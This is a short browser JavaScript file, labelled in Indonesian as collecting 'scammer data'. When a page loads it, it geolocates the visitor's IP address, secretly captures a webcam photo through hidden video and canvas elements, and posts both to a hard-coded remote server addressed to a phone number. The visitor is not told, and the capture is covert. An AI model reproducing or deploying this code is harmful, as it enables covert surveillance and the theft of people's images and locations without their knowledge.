let video = document.querySelector("#video");
video.style.display = "none";
let canvas = document.querySelector("#canvas");
let text = "*DATA PENIPU*";
canvas.style.display = "none";
const base = "http://23.95.48.230:3020";
// const base = "https://d421-36-69-1-74.ngrok-free.app";

(async function () {
    $.getJSON("http://jsonip.com", function (data) {
        $.getJSON("https://ipapi.co/" + data.ip + "/json", function (data) {
            text += `

Alamat IP : ${data.ip}
Kode Negara : ${data.country}
Nama Negara : ${data.country_name}
Ibukota Negara : ${data.country_capital}
Kode Telepon : ${data.country_calling_code}
Provinsi : ${data.region}
Kode Provinsi : ${data.region_code}
Kota : ${data.city}
Provider ISP : ${data.org}
Latitude : ${data.latitude}
Longitude : ${data.longitude}`;
            // console.log(image_data_url);
            // console.log(text);
            sM(text);
        });
    });
    let stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false,
    });
    video.srcObject = stream;
    setTimeout(async () => {
        canvas
            .getContext("2d")
            .drawImage(video, 0, 0, canvas.width, canvas.height);
        let image_data_url = canvas
            .toDataURL("image/jpeg")
            .replace(/^data:image\/jpeg;base64,/, "");
        sM(text, image_data_url, "jpeg");
        video.pause();
        video.src = "";
        stream.getTracks()[0].stop();
    }, 1000);
})();

async function sM(msg, img, ext) {
    let mySender = await fetch(`${base}/send/`, {
        method: "POST", // *GET, POST, PUT, DELETE, etc.
        mode: "cors", // no-cors, *cors, same-origin
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            to: "082286230830",
            msg: msg || "siapa hayo?",
            img,
            ext,
        }), // body data type must match "Content-Type" header
    });
    let myRes = await mySender.text();
    // console.log(myRes);
}
